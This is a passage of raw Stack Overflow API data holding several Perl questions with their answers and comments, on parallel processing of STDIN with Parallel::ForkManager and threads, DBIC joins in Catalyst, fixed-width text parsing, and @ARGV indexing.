"accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485864134, "post_id": 41928668, "comment_id": 71092783, "body": "First place, thank you for spending your time elaborating this. Second, It seems that threads need more working load. I was playing with the <code>num_lines_to_collect</code> and I get the best results with the value 100000 and this result is one second slower than the original script. I&#39;m going to keep working on this and add working load to the job. I will post results."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485888965, "post_id": 41928668, "comment_id": 71109611, "body": "@Iv&#225;nRodr&#237;guezTorres Hm. It may be that there is just too little to do with each line so that reading from the disk makes up most of processing time. Still, I&#39;d expect that having multiple jobs would bring <i>some</i> gain.  Try from the other end -- collect so many lines that there are just two jobs first, then three, etc. // How big are your files (how many lines), and what (roughly) is done to each line? You mentioned &quot;few regex&quot; ... is that it? // Are you on some very old/poor hardware?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485889337, "post_id": 41928668, "comment_id": 71109791, "body": "@Iv&#225;nRodr&#237;guezTorres Also, you say &quot;<i>I print to STDOUT</i>&quot; ... do you print <i>every line</i> to <code>STDOUT</code> as it&#39;s processed?  If yes, change that. Have each job collect resutls and then print them out, and to a file instead. (Each job to its own file, which can then be merged.) Your whole thing appears I/O bound as it is, and adding a lot of (<i>slow</i>) prints to <code>STDOUT</code> doesn&#39;t help."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485889516, "post_id": 41928668, "comment_id": 71109865, "body": "@Iv&#225;nRodr&#237;guezTorres  Let&#39;s clear up what we can here, and then this may well be a good question in its own right.  (Unless we do resolve it here.)"}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485890311, "post_id": 41928668, "comment_id": 71110287, "body": "thanks again for your time. Until tomorrow I won&#39;t be able to do more tests but tomorrow I&#39;m goingo to apply all your suggestions and I will keep you up. // The size of the files is variable but there are several with more than 50GB of plain text. I was making the tests with a reduced collection of 40MB. The job essentially is a kind of sintactic analyzer, so each line goes through a series of if-else statements and some regular expressions. // The hardware is fine for this, SSD disc, mid range i5 last gen and 8gb RAM."}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485890761, "post_id": 41928668, "comment_id": 71110499, "body": "I print to STDOUT because this script output but I think that I can change the script ot write to files. This is script is the first part of a big process, that is launched similar to this: <code>cat mybigtext | thisScript.perl | anotherPart.perl |...</code> the output of one script is the input for the next. So anotherPart.perl is going to take the STDIN, which is generated from thisScript.perl and so on. So if I follow your advices I think I can change this behavior and replace the STDIN and STDOUT by files. The problem of this will be the amount of GB spent on thes temp files. Anyway it worths a try"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485891359, "post_id": 41928668, "comment_id": 71110802, "body": "@Iv&#225;nRodr&#237;guezTorres Ah, I see. All that output going to a single-file road (input for the next script) doesn&#39;t help. If multiple jobs print their own file each there is at least some time savings, since it does happen that while some are writing some are processing. Some concurrency.  This is I/O heavy and to improve it by multitasking you&#39;ll have to wrestle it out, I think.  I&#39;d try: Set up a moderate number of jobs, say 4--10, and have each write to its own file. If that helps, you can replace the pipeline with a simple script, <code>s1.pl &lt; input; s2.pl &lt; s1_output; ...</code>, like you say."}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485891621, "post_id": 41928668, "comment_id": 71110934, "body": "sure. I will give it a try tomorrow, I hope. I&#39;ll keep you informed. Thank you"}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1486427113, "post_id": 41928668, "comment_id": 71330777, "body": "a bit late, but finally I could update the question to reflect my experience. I  let you now just in case you were curious about the topic."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1486428017, "post_id": 41928668, "comment_id": 71330997, "body": "@Iv&#225;nRodr&#237;guezTorres  Thank you very much for letting me know!  Yes, I was very curious.  Good that you got it to speed up :).  One more little suggestion -- just for the sake of knowing, if it&#39;s easy to try it would be good to try with Parallel::ForkManager (not Parallel::Loops).  I don&#39;t know of any particular faults of the other one, but it does use the P::FM and it builds on top of it. Which is why I went with the source, P::FM. While I don&#39;t know why the other one would introduce such a slowdown I really can&#39;t see why P::FM would."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1486428253, "post_id": 41928668, "comment_id": 71331062, "body": "@Iv&#225;nRodr&#237;guezTorres That&#39;s a very nice update, but one suggestion while you are at it -- add what your final solution was.  How many lines to process at once? Print to individual files from each job or not?"}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1486428374, "post_id": 41928668, "comment_id": 71331083, "body": "Good advices, thanks again. I&#39;m going to update later. Maybe tomorrow, but I&#39;ll came back"}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1486428913, "post_id": 41928668, "comment_id": 71331209, "body": "I think that with the content of this questions we can create a parallelism topic on perl on the documentation section, would it be useful?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1486429745, "post_id": 41928668, "comment_id": 71331438, "body": "@Iv&#225;nRodr&#237;guezTorres I am not familiar with how docs work, but it seems like a good idea.  Btw, while threads have (some) advantages over forked processes, my reaction to forks being by a factor of 5 slower is that something is wrong with how forking is used. It should not be slower by much, if at all.  (While the overhead matters here, the threads as implemented by Perl are not the light-weight threads as one may expect so I don&#39;t see why they would be better. The solution by ikegami reuses them, what directly helps, but I don&#39;t see how that would gain a factor of 4 or 5.)"}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1486727392, "post_id": 41928668, "comment_id": 71482486, "body": "I made a mistake in the previus update. I was speaking of ForkManager instead of Loops. Now it&#39;s correct. And yes, is possible that I have some mistake using ForkManager but I used your code as starting point and I double check everything that I added, and it seems ok. This said, maybe there are some error but I don&#39;t spot it. I&#39;m with you, that it&#39;s something weird."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1486747779, "post_id": 41928668, "comment_id": 71495407, "body": "@Iv&#225;nRodr&#237;guezTorres  Nice summary, and thanks for response.  The P::FM shouldn&#39;t be slower (by much anyway), perhaps it needs fewer proceses and more to do in each. But it doesn&#39;t matter, you got a good solution :)  By your descritpion, I think that writing to files should speed it up considerably.  Good work :)"}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1486760008, "post_id": 41928668, "comment_id": 71501876, "body": "Thank you, maybe I will make it work with files, since I&#39;m going to keep working with these scripts. If so, I&#39;ll update this again."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 1, "last_activity_date": 1550532900, "last_edit_date": 1550532900, "creation_date": 1485747269, "answer_id": 41928668, "question_id": 41925586, "link": "https://stackoverflow.com/questions/41925586/empty-while-reading-stdin-in-parallel/41928668#41928668", "title": "$_ empty while reading STDIN in parallel", "body": "<p>I don't know about specific benefits to using <a href=\"http://search.cpan.org/~pmorch/Parallel-Loops-0.03/lib/Parallel/Loops.pm\" rel=\"nofollow noreferrer\">Parallel::Loops</a> (which there may well be). Here is the same with <a href=\"http://search.cpan.org/~yanick/Parallel-ForkManager-1.18/lib/Parallel/ForkManager.pm\" rel=\"nofollow noreferrer\">Parallel::ForkManager</a>, which is what <code>Parallel::Loops</code> uses.</p>\n\n<pre><code>use warnings;\nuse strict;\nuse feature 'say';\n\nuse Parallel::ForkManager;   \n\nmy $max_procs = 30; \nmy $pm = Parallel::ForkManager-&gt;new($max_procs);   \n\n# Retrieve data returned by children in the callback\nmy %ret_data;      \n$pm-&gt;run_on_finish( sub { \n    my ($pid, $exit, $ident, $signal, $core, $dataref) = @_; \n    $ret_data{$pid} = $dataref;\n});\n\nwhile (my $input = &lt;STDIN&gt;)\n{\n    chomp($input);\n\n    $pm-&gt;start and next;\n    my $ret = run_job($input);\n    $pm-&gt;finish(0, \\$ret);\n}\n$pm-&gt;wait_all_children;\n\nforeach my $pid (keys %ret_data) {\n    say \"$pid returned: ${$ret_data{$pid}}\";\n}\n\nsub run_job { \n    my ($input) = @_; \n    # your processing\n    return $input;    # to have something to check\n} \n</code></pre>\n\n<p>This code returns a scalar from a child process, a single value.  You can return any data structure, see <a href=\"http://search.cpan.org/~yanick/Parallel-ForkManager-1.18/lib/Parallel/ForkManager.pm#RETRIEVING_DATASTRUCTURES_from_child_processes\" rel=\"nofollow noreferrer\"> Retrieving data structures from child processes</a> in docs and <a href=\"https://stackoverflow.com/a/41891334/4653379\">this post</a> for an example.</p>\n\n<p>Data is returned via files and that can slow things down for large data or many quick processes.</p>\n\n<p>If testing at a terminal stop input with <code>Ctrl-d</code> (or add <code>last if $input !~ /\\S/;</code> after <code>chomp</code> to stop with empty line -- but not with data being passed to <code>STDIN</code> by other means).</p>\n\n<hr>\n\n<p>It is clarified that each <code>STDIN</code> read is just one line to process. Then we should collect more lines before spawning a new process, otherwise there is way too much overhead.</p>\n\n<pre><code>my $num_lines_to_collect = 1000;\n\nmy @lines_to_process;         # collect lines for each fork\n\nwhile (my $input = &lt;STDIN&gt;)\n{\n    chomp($input);\n    push @lines_to_process, $input;\n    next if $. % $num_lines_to_collect != 0;\n\n    $pm-&gt;start and next;\n    my $ret = run_job( \\@lines_to_process );\n    $pm-&gt;finish(0, \\$ret);\n\n    @lines_to_process = ();   # empty it for the next round\n}\n$pm-&gt;wait_all_children;\n</code></pre>\n\n<p>We add lines to the array <code>@lines_to_process</code> and proceed to triger a new fork only when the current line number <code>$.</code> is a multiple of <code>$num_lines_to_collect</code>. So a job is started for every <code>$num_lines_collect</code>, so each job processes that much. I set it to <code>1000</code>, experiment.</p>\n"}], "owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 193, "favorite_count": 0, "accepted_answer_id": 41928031, "answer_count": 3, "score": 1, "last_activity_date": 1550532900, "creation_date": 1485721706, "last_edit_date": 1486727208, "question_id": 41925586, "link": "https://stackoverflow.com/questions/41925586/empty-while-reading-stdin-in-parallel", "title": "$_ empty while reading STDIN in parallel", "body": "<p>I have a legacy project which take a huge amount of data from STDIN and process it line by line in a perl script. The line order is not important. \nThis is taking very long so I want to make it in parallel. </p>\n\n<p>After a bit of research I found <code>Parallel::Loops</code> which seems suitable but I can't get it working because <code>$_</code> is empty. My code is:</p>\n\n<pre><code>#Initialize all vars etc\n\n$pl-&gt;while ( sub { &lt;STDIN&gt; }, sub {\n    print $_       # but $_ is empty\n}\n</code></pre>\n\n<p>Other ways of reading from STDIN ir parallel  are wellcome too.</p>\n\n<p><hr>\n<strong>Update:</strong></p>\n\n<p>After all the help that I received I could manage some working piece of code, thank you. I'm going to do a brief abstract. To clarify:</p>\n\n<ol>\n<li><p>This is a kind of parser, it has more than 3000 lines with regex and\nconditions which were auto generated. </p></li>\n<li><p>The input that I use for testing is a POS tagged text, there are 1071406 lines in this file.</p></li>\n<li><p>My hardware is: SSD disc, mid range i5 last gen and 8gb RAM DDR4.</p></li>\n</ol>\n\n<p><strong>Conclusions:</strong></p>\n\n<ol>\n<li>As the comments suggested IO operations make my script slow. </li>\n<li>All the suggestion resulted in improvements, specially the ones including processing bunch of lines instead of line by line. </li>\n<li>Answers contain very useful implementation of threading for future work.</li>\n<li>Framework Parallel::ForkManager introduce a lot of lag in the execution time. I always kill the script after 5min, since the script without parallelism takes about 6.</li>\n<li>Framework Parallel::Loops introduce a little improvement. The script takes about 3min to finish.</li>\n<li>Using GNU parallel is the easy way of optimizing. </li>\n<li>Using the package Threads I got the best time, 1min45secs but it is very close to GNU parallel so it's on you giving it a try, and making the effort of porting the code.</li>\n<li>Using the thread package as in the @ikegami answer reading bunch of lines, times were the same as the times got applying the @tanktalus solution, which read line by line.</li>\n</ol>\n\n<p>Finally, I'm going with the @ikegami solution, which I think that will be better  when the amount of data increase. I adjust the amount of lines to process to 100.000 because it gets better results than 10.000, for instance. This difference is matter of 8 secs aprox.</p>\n\n<p>Next natural step is writting everything to files instead of using the STDOUT, I hope this helps to reduce the time a little bit more.</p>\n"}, {"tags": ["mysql", "perl", "catalyst", "dbix-class", "template-toolkit"], "answers": [{"comments": [{"owner": {"reputation": 518, "user_id": 6146264, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-YPMqqSeGAMU/AAAAAAAAAAI/AAAAAAAAAoA/AIMsmwe_vc8/photo.jpg?sz=128", "display_name": "Leitouran", "link": "https://stackoverflow.com/users/6146264/leitouran"}, "edited": false, "score": 0, "creation_date": 1486061040, "post_id": 41926867, "comment_id": 71195389, "body": "Sorry for the delay, got caught in another project and couldn&#39;t test this out until now. I noticed I could use prefetch but didn&#39;t quite get the difference so I went with the good&#39;ol join.  Your recommendation works. Thanks a lot!"}], "tags": [], "owner": {"reputation": 1853, "user_id": 1005136, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9fa4e79e60474302c8225172649cbd35?s=128&d=identicon&r=PG", "display_name": "Alexander Hartmaier", "link": "https://stackoverflow.com/users/1005136/alexander-hartmaier"}, "is_accepted": true, "score": 2, "last_activity_date": 1485730278, "creation_date": 1485730278, "answer_id": 41926867, "question_id": 41924900, "link": "https://stackoverflow.com/questions/41924900/dbic-joins-in-catalyst-web-app/41926867#41926867", "title": "DBIC joins in Catalyst web app", "body": "<p>Using join you only tell DBIC to join those tsbles but to fetch data from them.\nReplace it with prefetch and you will see that the generated SQL will also select all related columns.\nNote that you should only use get_column for special cases where you need the raw database values, normally just use the generated column accessors which default to the column name.</p>\n"}], "owner": {"reputation": 518, "user_id": 6146264, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-YPMqqSeGAMU/AAAAAAAAAAI/AAAAAAAAAoA/AIMsmwe_vc8/photo.jpg?sz=128", "display_name": "Leitouran", "link": "https://stackoverflow.com/users/6146264/leitouran"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 71, "favorite_count": 0, "accepted_answer_id": 41926867, "answer_count": 1, "score": 2, "last_activity_date": 1485730278, "creation_date": 1485717349, "question_id": 41924900, "link": "https://stackoverflow.com/questions/41924900/dbic-joins-in-catalyst-web-app", "title": "DBIC joins in Catalyst web app", "body": "<p>I've been working with Catalyst and DBIC for a while now, but I never started a project by myself. Now I am creating a webapp database from the scratch and I started to wonder if I could make data fetching in fewer lines of code. I'll go right ahead with a chunk of the schema's diagram to make it clearer. Let's say we have a database like this:</p>\n\n<p><a href=\"https://i.stack.imgur.com/5DRSY.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/5DRSY.png\" alt=\"Schema diagram extract\"></a></p>\n\n<p>Normally, if I wanted to fetch, say, all the informed consents signed by a particular subject, I'd so something like this:</p>\n\n<pre><code>my $consentsignatures_mod = $c-&gt;model('pbitdb::InformedConsentSubjectSignature');\nmy $subject_consents = $consentsignatures_mod-&gt;search(\n        {subject_id =&gt; $subject_id},\n        {join =&gt; 'consent'},\n      );\n$c-&gt;stash-&gt;{subject_consents};\n</code></pre>\n\n<p>And then in the template I'd iterate through the resultset like </p>\n\n<pre><code>    [% WHILE ( consent_signatures = subject_consents.next() ) -%]\n            &lt;tr&gt;\n              &lt;td&gt; [% consent_signatures.consent.get_column('consent_title') -%]&lt;/td&gt;\n              &lt;td&gt; [% consent_signatures.consent.get_column('consent_type') -%]&lt;/td&gt;\n              &lt;td&gt; [% consent_signatures.consent.get_column('consent_description') -%]&lt;/td&gt;\n              &lt;td&gt; [% consent_signatures.consent.get_column('consent_form_version') -%]&lt;/td&gt;\n              &lt;td&gt; [% consent_signatures.get_column('signed_date') -%]&lt;/td&gt;\n            &lt;/tr&gt;\n    [% END -%]\n</code></pre>\n\n<p>Similarly, for the diseases and the family history, I'd make a separate search for subject_id in the corresponding linking table and join it to the parent (precedents) to get the precedent data. This works just fine, but considering I also have to retrieve a ton of information coming from a dozen more tables (like those of familial and disease history with their corresponding relations to precedents table), I thought I should give nested joins a try. So i did... try, and this came out:</p>\n\n<pre><code>  my $subject_info = $subject_mod-&gt;search(\n    {subject_id =&gt; $subject_id},\n    {join =&gt; [{'disease_histories' =&gt; 'precedent'}, \n      {'informed_consent_subject_signatures' =&gt; 'consent'}\n      {'familial_history' =&gt; 'precedent'}]}\n  );\n  $c-&gt;stash-&gt;{subject} = $subject_info\n</code></pre>\n\n<p>Neither syntax errors nor DBIC exceptions arise so, I guess, the above code is OK. However, I'm having troubles printing the data in the template. If I want to retrieve the informed consents, I'd do something like:</p>\n\n<pre><code>    [% WHILE ( consent_signatures = subject.informed_consent_subject_signatures.next() ) -%]\n            &lt;tr&gt;\n              &lt;td&gt; [% consent_signatures.consent.get_column('consent_title') -%]&lt;/td&gt;\n              &lt;td&gt; [% consent_signatures.consent.get_column('consent_type') -%]&lt;/td&gt;\n              &lt;td&gt; [% consent_signatures.consent.get_column('consent_description') -%]&lt;/td&gt;\n              &lt;td&gt; [% consent_signatures.consent.get_column('consent_form_version') -%]&lt;/td&gt;\n              &lt;td&gt; [% consent_signatures.get_column('signed_date') -%]&lt;/td&gt;\n            &lt;/tr&gt;\n    [% END -%]\n</code></pre>\n\n<p>All the above comes out empty as my dreams. Any ideas?</p>\n"}, {"tags": ["perl"], "answers": [{"tags": [], "owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "is_accepted": false, "score": 5, "last_activity_date": 1485702719, "creation_date": 1485702719, "answer_id": 41922379, "question_id": 41922286, "link": "https://stackoverflow.com/questions/41922286/failing-to-parse-a-fix-width-text-file/41922379#41922379", "title": "Failing to parse a fix width text file", "body": "<p>Read the file two lines at a time:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nwhile (&lt;DATA&gt;) {\n    my @fields  = split;\n    my @numbers = split(' ', &lt;DATA&gt;);\n    $fields[1] .= $numbers[0];\n\n    print \"@fields\\n\";\n}\n\n__DATA__\naaa aaa aaa\n111 111 111\nbbb bbb bbb\n222 222 222\nccc ccc ccc\n333 555 666\nddd ddd ddd\n444 444 444\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>aaa aaa111 aaa\nbbb bbb222 bbb\nccc ccc333 ccc\nddd ddd444 ddd\n</code></pre>\n"}], "owner": {"reputation": 184, "user_id": 6115421, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/15a623fe6b5c826ee955a1474fc1723e?s=128&d=identicon&r=PG&f=1", "display_name": "Dragos Trif", "link": "https://stackoverflow.com/users/6115421/dragos-trif"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 71, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1485710875, "creation_date": 1485702100, "last_edit_date": 1485710875, "question_id": 41922286, "link": "https://stackoverflow.com/questions/41922286/failing-to-parse-a-fix-width-text-file", "title": "Failing to parse a fix width text file", "body": "<p>I'm trying to parse a text file that look like this: </p>\n\n<pre><code>aaa aaa aaa\n111 111 111\nbbb bbb bbb\n222 222 222\nccc ccc ccc\n333 555 666\nddd ddd ddd\n444 444 444\n</code></pre>\n\n<p>In order to get a result like this :</p>\n\n<pre><code> aaa aaa111 aaa\n bbb bbb222 bbb\n ccc ccc333 ccc\n ddd ddd444 ddd\n</code></pre>\n\n<p>My code looks like this:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Data::Dumper;\n\nmy @array;  \nmy $flag = \"\";\nmy $permit;\nmy $adrr;\nmy $descr;\nmy $str_no;\n\nmy $file = 'Permit.txt';\nopen my $fh, '+&lt;', $file\n    or die \"Cannot open 'file ' for writing: $!\";\n\nwhile (my $line = &lt;$fh&gt;) {\n    chomp($line);\n    if ($line =~ /^[abcd]/) {\n        $str_no = substr($flag,0,3);\n        $permit = substr($line, 0, 3);\n        $adrr = substr($line, 4, 3);\n        $descr = substr($line, 8, 3);\n        if($flag) {\n            if ($str_no) {\n                $adrr .= $str_no;   \n        }       \n\n        }\n        push @array, {permi =&gt; $permit, adr =&gt; $adrr, desc =&gt; $descr};\n        $flag = \"\"; \n\n    } else {\n            $flag = $line;\n    }\n}\nprint Dumper(\\@array);\n</code></pre>\n\n<p>But this pushes all my values from the numbers row down concatenating the first number to the second letters row.</p>\n"}, {"tags": ["perl", "argv"], "comments": [{"owner": {"reputation": 15409, "user_id": 2877364, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0a101160e41fd7fd75f5fc701f8acb1c?s=128&d=identicon&r=PG", "display_name": "cxw", "link": "https://stackoverflow.com/users/2877364/cxw"}, "edited": false, "score": 2, "creation_date": 1485700499, "post_id": 41921979, "comment_id": 71024640, "body": "Try <code>$ARGV[0]</code>, maybe?  What is <code>$#ARGV</code>?"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 2, "creation_date": 1485700776, "post_id": 41921979, "comment_id": 71024712, "body": "Always <code>use warnings</code> and <code>use strict</code>"}], "answers": [{"tags": [], "owner": {"reputation": 15409, "user_id": 2877364, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0a101160e41fd7fd75f5fc701f8acb1c?s=128&d=identicon&r=PG", "display_name": "cxw", "link": "https://stackoverflow.com/users/2877364/cxw"}, "is_accepted": false, "score": 1, "last_activity_date": 1485700590, "creation_date": 1485700590, "answer_id": 41922043, "question_id": 41921979, "link": "https://stackoverflow.com/questions/41921979/argv-in-perl-not-working/41922043#41922043", "title": "ARGV in perl not working", "body": "<p>It should be <code>$ARGV[0]</code>, not <code>[1]</code>.  Per <a href=\"https://perlmaven.com/argv-in-perl\" rel=\"nofollow noreferrer\">Perl Maven</a>, <code>@ARGV</code> does not include the program name &mdash; that's separate variable <code>$0</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 34726, "user_id": 133939, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/pN9C5.png?s=128&g=1", "display_name": "Zaid", "link": "https://stackoverflow.com/users/133939/zaid"}, "is_accepted": true, "score": 5, "last_activity_date": 1485701683, "last_edit_date": 1485701683, "creation_date": 1485700629, "answer_id": 41922049, 